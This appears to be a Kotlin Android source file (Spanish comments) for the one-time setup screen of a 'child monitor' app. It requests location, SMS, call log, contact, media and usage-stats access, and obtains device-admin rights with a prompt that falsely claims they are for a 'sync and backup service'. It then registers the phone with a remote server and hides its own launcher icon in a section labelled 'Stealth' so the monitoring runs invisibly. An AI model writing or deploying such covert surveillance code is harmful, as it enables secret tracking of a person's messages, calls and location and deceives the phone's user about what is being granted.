package com.monitor.child.setup

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.google.gson.Gson
import com.monitor.child.BuildConfig
import com.monitor.child.R
import com.monitor.child.admin.DeviceAdminReceiver
import com.monitor.child.data.PreferencesManager
import com.monitor.child.service.MonitorService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody

/**
 * Actividad de configuración inicial. Se ejecuta UNA SOLA VEZ.
 *
 * Flujo:
 * 1. Solicitar todos los permisos necesarios
 * 2. Pedir al usuario que active Device Admin
 * 3. Registrar el dispositivo en el servidor con el token de emparejamiento
 * 4. Ocultar el icono del launcher
 * 5. Arrancar MonitorService
 * 6. Cerrar la actividad
 *
 * Después de esto, la app es invisible y autónoma.
 */
class SetupActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "SetupActivity"
        private const val REQUEST_DEVICE_ADMIN = 101
    }

    private val prefs by lazy { PreferencesManager(this) }
    private val gson = Gson()

    private lateinit var tvStatus: TextView
    private lateinit var btnAction: Button
    private lateinit var etPairingCode: EditText
    private lateinit var etServerUrl: EditText
    private lateinit var progressBar: ProgressBar

    private var currentStep = Step.PERMISSIONS

    private enum class Step {
        PERMISSIONS, DEVICE_ADMIN, REGISTER, DONE
    }

    // Launcher para solicitar múltiples permisos
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val denied = results.filter { !it.value }.keys
        if (denied.isEmpty()) {
            Log.d(TAG, "Todos los permisos concedidos")
            currentStep = Step.DEVICE_ADMIN
            updateUI()
        } else {
            Log.w(TAG, "Permisos denegados: $denied")
            showStatus("Algunos permisos fueron denegados. Pulsa para reintentar.")
        }
    }

    // Launcher para activar Device Admin
    private val deviceAdminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (isDeviceAdminActive()) {
            Log.d(TAG, "Device Admin activado")
            currentStep = Step.REGISTER
            updateUI()
        } else {
            showStatus("Activa el administrador para continuar.")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Si ya está configurado, arrancar servicio y salir
        CoroutineScope(Dispatchers.Main).launch {
            if (prefs.isSetupComplete()) {
                MonitorService.startForeground(this@SetupActivity)
                finish()
                return@launch
            }
            initUI()
        }
    }

    private fun initUI() {
        // Layout mínimo programático — no necesitamos XML complejo
        setContentView(createLayout())
        updateUI()
    }

    private fun createLayout(): View {
        // Layout simple creado programáticamente
        val layout = android.widget.LinearLayout(this).apply {
            orientation = android.widget.LinearLayout.VERTICAL
            setPadding(64, 128, 64, 64)
        }

        tvStatus = TextView(this).apply {
            textSize = 16f
            setPadding(0, 0, 0, 32)
        }

        etServerUrl = EditText(this).apply {
            hint = "URL del servidor (dejar vacío = usar por defecto)"
            setText(BuildConfig.SERVER_URL)
            visibility = View.GONE
        }

        etPairingCode = EditText(this).apply {
            hint = "Código de emparejamiento"
            visibility = View.GONE
        }

        progressBar = ProgressBar(this).apply {
            visibility = View.GONE
        }

        btnAction = Button(this).apply {
            setOnClickListener { onActionClick() }
        }

        layout.addView(tvStatus)
        layout.addView(etServerUrl)
        layout.addView(etPairingCode)
        layout.addView(progressBar)
        layout.addView(btnAction)

        return layout
    }

    private fun updateUI() {
        when (currentStep) {
            Step.PERMISSIONS -> {
                tvStatus.text = "Paso 1/3: Conceder permisos necesarios"
                btnAction.text = getString(R.string.btn_grant_permissions)
            }
            Step.DEVICE_ADMIN -> {
                tvStatus.text = "Paso 2/3: Activar administrador del dispositivo"
                btnAction.text = getString(R.string.btn_activate_admin)
            }
            Step.REGISTER -> {
                tvStatus.text = "Paso 3/3: Introduce el código de emparejamiento"
                etPairingCode.visibility = View.VISIBLE
                etServerUrl.visibility = View.VISIBLE
                btnAction.text = getString(R.string.btn_finish)
            }
            Step.DONE -> {
                tvStatus.text = "Configuración completada"
                btnAction.visibility = View.GONE
            }
        }
    }

    private fun onActionClick() {
        when (currentStep) {
            Step.PERMISSIONS -> requestAllPermissions()
            Step.DEVICE_ADMIN -> requestDeviceAdmin()
            Step.REGISTER -> registerDevice()
            Step.DONE -> {}
        }
    }

    // ─── Permisos ──────────────────────────────────────────────────────────

    private fun requestAllPermissions() {
        val permissions = mutableListOf(
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.READ_PHONE_STATE,
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(android.Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(android.Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            permissions.add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        permissionLauncher.launch(permissions.toTypedArray())

        // Permiso de ubicación en background — requiere solicitarse por separado
        requestBackgroundLocation()

        // Ignorar optimización de batería — para que el servicio no se mate
        requestBatteryOptimizationExemption()

        // Permiso de estadísticas de uso (para tiempo por app)
        if (!hasUsageStatsPermission()) {
            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
        }
    }

    private fun requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) !=
                PackageManager.PERMISSION_GRANTED
            ) {
                requestPermissions(
                    arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                    1
                )
            }
        }
    }

    private fun requestBatteryOptimizationExemption() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            val intent = Intent(
                Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                Uri.parse("package:$packageName")
            )
            startActivity(intent)
        }
    }

    private fun hasUsageStatsPermission(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = appOps.checkOpNoThrow(
            android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(),
            packageName
        )
        return mode == android.app.AppOpsManager.MODE_ALLOWED
    }

    // ─── Device Admin ─────────────────────────────────────────────────────

    private fun requestDeviceAdmin() {
        if (isDeviceAdminActive()) {
            currentStep = Step.REGISTER
            updateUI()
            return
        }

        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(
                DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                ComponentName(this@SetupActivity, DeviceAdminReceiver::class.java)
            )
            putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Necesario para el servicio de sincronización y copia de seguridad"
            )
        }
        deviceAdminLauncher.launch(intent)
    }

    private fun isDeviceAdminActive(): Boolean {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val component = ComponentName(this, DeviceAdminReceiver::class.java)
        return dpm.isAdminActive(component)
    }

    // ─── Registro en el servidor ──────────────────────────────────────────

    private fun registerDevice() {
        val pairingCode = etPairingCode.text.toString().trim()
        if (pairingCode.isBlank()) {
            Toast.makeText(this, "Introduce el código de emparejamiento", Toast.LENGTH_SHORT).show()
            return
        }

        val serverUrlInput = etServerUrl.text.toString().trim()
        val serverUrl = serverUrlInput.ifBlank { BuildConfig.SERVER_URL }

        btnAction.isEnabled = false
        progressBar.visibility = View.VISIBLE
        showStatus("Registrando dispositivo...")

        CoroutineScope(Dispatchers.Main).launch {
            val result = withContext(Dispatchers.IO) {
                registerWithServer(serverUrl, pairingCode)
            }

            progressBar.visibility = View.GONE

            if (result != null) {
                prefs.saveDeviceCredentials(result.deviceId, result.deviceToken)
                prefs.setServerUrl(serverUrl)
                prefs.setSetupComplete(true)

                currentStep = Step.DONE
                updateUI()
                hideAppIcon()
                MonitorService.startForeground(this@SetupActivity)

                Toast.makeText(this@SetupActivity, "Configuración completada", Toast.LENGTH_SHORT).show()
                finish()
            } else {
                showStatus("Error al registrar. Comprueba el código e inténtalo de nuevo.")
                btnAction.isEnabled = true
            }
        }
    }

    private fun registerWithServer(serverUrl: String, pairingCode: String): RegisterResult? {
        return try {
            val client = OkHttpClient()
            val body = gson.toJson(
                mapOf(
                    "pairingCode" to pairingCode,
                    "deviceModel" to Build.MODEL,
                    "androidVersion" to Build.VERSION.RELEASE,
                    "appVersion" to BuildConfig.VERSION_NAME,
                )
            ).toRequestBody("application/json".toMediaType())

            val request = Request.Builder()
                .url("$serverUrl/api/devices/pair")
                .post(body)
                .build()

            val response = client.newCall(request).execute()
            if (!response.isSuccessful) return null

            val json = response.body?.string() ?: return null
            gson.fromJson(json, RegisterResult::class.java)
        } catch (e: Exception) {
            Log.e(TAG, "Error registrando: ${e.message}")
            null
        }
    }

    // ─── Stealth — ocultar icono ──────────────────────────────────────────

    private fun hideAppIcon() {
        Log.d(TAG, "Ocultando icono del launcher")
        packageManager.setComponentEnabledSetting(
            ComponentName(this, SetupActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    // ─── Helpers ──────────────────────────────────────────────────────────

    private fun showStatus(message: String) {
        tvStatus.text = message
    }

    private data class RegisterResult(
        val deviceId: String,
        val deviceToken: String,
    )
}
